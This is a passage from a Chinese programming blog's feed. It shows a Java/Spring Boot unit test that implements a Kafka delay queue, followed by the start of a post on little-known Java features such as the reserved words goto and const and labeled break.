&lt;h3 id="java代码实现">Java代码实现&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.fasterxml.jackson.core.JsonProcessingException;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.fasterxml.jackson.databind.JsonNode;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.fasterxml.jackson.databind.ObjectMapper;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.apache.kafka.clients.consumer.*;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.apache.kafka.clients.producer.KafkaProducer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.apache.kafka.clients.producer.ProducerConfig;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.apache.kafka.clients.producer.ProducerRecord;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.apache.kafka.common.TopicPartition;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.apache.kafka.common.serialization.StringDeserializer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.apache.kafka.common.serialization.StringSerializer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.junit.jupiter.api.BeforeEach;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.junit.jupiter.api.Test;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> org.springframework.boot.test.context.SpringBootTest;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.time.Duration;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.util.*;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.util.concurrent.ExecutionException;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>@SpringBootTest
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">DelayQueueTest&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> KafkaConsumer&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>String, String&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> consumer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> KafkaProducer&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>String, String&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> producer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">volatile&lt;/span> Boolean exit &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> Object lock &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> Object();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> String servers &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> @BeforeEach
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">initConsumer&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Properties props &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> Properties();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ConsumerConfig.&lt;span style="color:#50fa7b">BOOTSTRAP_SERVERS_CONFIG&lt;/span>, servers);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ConsumerConfig.&lt;span style="color:#50fa7b">GROUP_ID_CONFIG&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;d&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ConsumerConfig.&lt;span style="color:#50fa7b">ENABLE_AUTO_COMMIT_CONFIG&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;false&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ConsumerConfig.&lt;span style="color:#50fa7b">AUTO_OFFSET_RESET_CONFIG&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;earliest&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ConsumerConfig.&lt;span style="color:#50fa7b">ISOLATION_LEVEL_CONFIG&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;read_committed&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ConsumerConfig.&lt;span style="color:#50fa7b">MAX_POLL_INTERVAL_MS_CONFIG&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;5000&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> KafkaConsumer&lt;span style="color:#ff79c6">&amp;lt;&amp;gt;&lt;/span>(props, &lt;span style="color:#ff79c6">new&lt;/span> StringDeserializer(), &lt;span style="color:#ff79c6">new&lt;/span> StringDeserializer());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> @BeforeEach
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">initProducer&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Properties props &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> Properties();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ProducerConfig.&lt;span style="color:#50fa7b">BOOTSTRAP_SERVERS_CONFIG&lt;/span>, servers);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ProducerConfig.&lt;span style="color:#50fa7b">VALUE_SERIALIZER_CLASS_CONFIG&lt;/span>, StringSerializer.&lt;span style="color:#50fa7b">class&lt;/span>.&lt;span style="color:#50fa7b">getName&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#50fa7b">put&lt;/span>(ProducerConfig.&lt;span style="color:#50fa7b">KEY_SERIALIZER_CLASS_CONFIG&lt;/span>, StringSerializer.&lt;span style="color:#50fa7b">class&lt;/span>.&lt;span style="color:#50fa7b">getName&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> producer &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> KafkaProducer&lt;span style="color:#ff79c6">&amp;lt;&amp;gt;&lt;/span>(props);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> @Test
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">testDelayQueue&lt;/span>() &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> JsonProcessingException, InterruptedException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String topic &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;delay-minutes-1&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> List&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>String&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> topics &lt;span style="color:#ff79c6">=&lt;/span> Collections.&lt;span style="color:#50fa7b">singletonList&lt;/span>(topic);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#50fa7b">subscribe&lt;/span>(topics);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Timer timer &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> Timer();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> timer.&lt;span style="color:#50fa7b">schedule&lt;/span>(&lt;span style="color:#ff79c6">new&lt;/span> TimerTask() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> @Override
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">run&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">synchronized&lt;/span> (lock) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#50fa7b">resume&lt;/span>(consumer.&lt;span style="color:#50fa7b">paused&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock.&lt;span style="color:#50fa7b">notify&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }, 0, 1000);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">do&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">synchronized&lt;/span> (lock) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ConsumerRecords&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>String, String&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> consumerRecords &lt;span style="color:#ff79c6">=&lt;/span> consumer.&lt;span style="color:#50fa7b">poll&lt;/span>(Duration.&lt;span style="color:#50fa7b">ofMillis&lt;/span>(200));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (consumerRecords.&lt;span style="color:#50fa7b">isEmpty&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock.&lt;span style="color:#50fa7b">wait&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">continue&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">boolean&lt;/span> timed &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">for&lt;/span> (ConsumerRecord&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>String, String&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> consumerRecord : consumerRecords) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">long&lt;/span> timestamp &lt;span style="color:#ff79c6">=&lt;/span> consumerRecord.&lt;span style="color:#50fa7b">timestamp&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TopicPartition topicPartition &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> TopicPartition(consumerRecord.&lt;span style="color:#50fa7b">topic&lt;/span>(), consumerRecord.&lt;span style="color:#50fa7b">partition&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (timestamp &lt;span style="color:#ff79c6">+&lt;/span> 60 &lt;span style="color:#ff79c6">*&lt;/span> 1000 &lt;span style="color:#ff79c6">&amp;lt;&lt;/span> System.&lt;span style="color:#50fa7b">currentTimeMillis&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String value &lt;span style="color:#ff79c6">=&lt;/span> consumerRecord.&lt;span style="color:#50fa7b">value&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectMapper objectMapper &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ObjectMapper();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JsonNode jsonNode &lt;span style="color:#ff79c6">=&lt;/span> objectMapper.&lt;span style="color:#50fa7b">readTree&lt;/span>(value);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JsonNode jsonNodeTopic &lt;span style="color:#ff79c6">=&lt;/span> jsonNode.&lt;span style="color:#50fa7b">get&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;topic&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String appTopic &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>, appKey &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>, appValue &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (jsonNodeTopic &lt;span style="color:#ff79c6">!=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appTopic &lt;span style="color:#ff79c6">=&lt;/span> jsonNodeTopic.&lt;span style="color:#50fa7b">asText&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (appTopic &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">continue&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JsonNode jsonNodeKey &lt;span style="color:#ff79c6">=&lt;/span> jsonNode.&lt;span style="color:#50fa7b">get&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;key&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (jsonNodeKey &lt;span style="color:#ff79c6">!=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appKey &lt;span style="color:#ff79c6">=&lt;/span> jsonNode.&lt;span style="color:#50fa7b">asText&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JsonNode jsonNodeValue &lt;span style="color:#ff79c6">=&lt;/span> jsonNode.&lt;span style="color:#50fa7b">get&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;value&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (jsonNodeValue &lt;span style="color:#ff79c6">!=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appValue &lt;span style="color:#ff79c6">=&lt;/span> jsonNodeValue.&lt;span style="color:#50fa7b">asText&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// send to application topic&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ProducerRecord&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>String, String&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> producerRecord &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ProducerRecord&lt;span style="color:#ff79c6">&amp;lt;&amp;gt;&lt;/span>(appTopic, appKey, appValue);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> producer.&lt;span style="color:#50fa7b">send&lt;/span>(producerRecord).&lt;span style="color:#50fa7b">get&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// success. commit message&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> OffsetAndMetadata offsetAndMetadata &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> OffsetAndMetadata(consumerRecord.&lt;span style="color:#50fa7b">offset&lt;/span>() &lt;span style="color:#ff79c6">+&lt;/span> 1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HashMap&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>TopicPartition, OffsetAndMetadata&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> metadataHashMap &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> HashMap&lt;span style="color:#ff79c6">&amp;lt;&amp;gt;&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> metadataHashMap.&lt;span style="color:#50fa7b">put&lt;/span>(topicPartition, offsetAndMetadata);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#50fa7b">commitSync&lt;/span>(metadataHashMap);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">catch&lt;/span> (ExecutionException e) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#50fa7b">pause&lt;/span>(Collections.&lt;span style="color:#50fa7b">singletonList&lt;/span>(topicPartition));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#50fa7b">seek&lt;/span>(topicPartition, consumerRecord.&lt;span style="color:#50fa7b">offset&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> timed &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#50fa7b">pause&lt;/span>(Collections.&lt;span style="color:#50fa7b">singletonList&lt;/span>(topicPartition));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#50fa7b">seek&lt;/span>(topicPartition, consumerRecord.&lt;span style="color:#50fa7b">offset&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> timed &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (timed) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock.&lt;span style="color:#50fa7b">wait&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">while&lt;/span> (&lt;span style="color:#ff79c6">!&lt;/span>exit);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这段程序是基于SpringBoot &lt;code>2.4.4&lt;/code>版本和 kafka-client &lt;code>2.7.0&lt;/code>版本编写的一个单元测试，需要修改私有变量&lt;code>servers&lt;/code>为kafka broker的地址。&lt;/p></description></item><item><title>Java的奇技淫巧</title><link>https://www.typesafe.cn/posts/java-unexpected-features/</link><pubDate>Sat, 13 Mar 2021 13:49:38 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-unexpected-features/</guid><description>&lt;p>&lt;strong>Java&lt;/strong>是一种广泛使用的计算机编程语言、面向对象、泛型编程的特性，广泛应用于企业级Web应用开发和移动应用开发。&lt;/p>
&lt;p>1995年3月23日&lt;strong>Sun&lt;/strong>公司发布了&lt;strong>Java&lt;/strong>，至今已有近26年，可以说是一门十分成熟的开发语言了，但在某些不为人知的地方存在着一些意料之外的特性。&lt;/p>
&lt;h3 id="java的保留关键字-goto和const">Java的保留关键字 goto和const&lt;/h3>
&lt;p>在&lt;strong>Java&lt;/strong>里面没有&lt;code>goto&lt;/code>这个功能，但它作为保留字是无法当做变量来使用的，&lt;code>const&lt;/code>也是同样。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">int&lt;/span> &lt;span style="color:#ff79c6">goto&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> 0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">int&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">const&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> 0;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上面这两行代码的写法存在问题，无法正常编译通过。&lt;/p>
&lt;h3 id="java标签label">Java标签Label&lt;/h3>
&lt;p>上面说了在&lt;strong>Java&lt;/strong>里面没有&lt;code>goto&lt;/code>这个功能，但为了处理多重循环引入了Label，目的是为了在多重循环中方便的使用 break 和coutinue ，但好像在其他地方也可以用。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">outerLoop&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">while&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;I&amp;#39;m the outer loop&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#8be9fd">int&lt;/span> i &lt;span style="color:#ff79c6">=&lt;/span> 0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#ff79c6">while&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;I am the inner loop&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		i&lt;span style="color:#ff79c6">++&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">if&lt;/span> (i &lt;span style="color:#ff79c6">&amp;gt;=&lt;/span> 3) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#ff79c6">break&lt;/span> outerLoop;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;Complete the loop&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// 输出&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I&amp;#39;m the outer loop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I am the inner loop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I am the inner loop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I am the inner loop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Complete the loop
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">test&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;hello&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#ff79c6">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">break&lt;/span> test; &lt;span style="color:#6272a4">// works&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;world&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
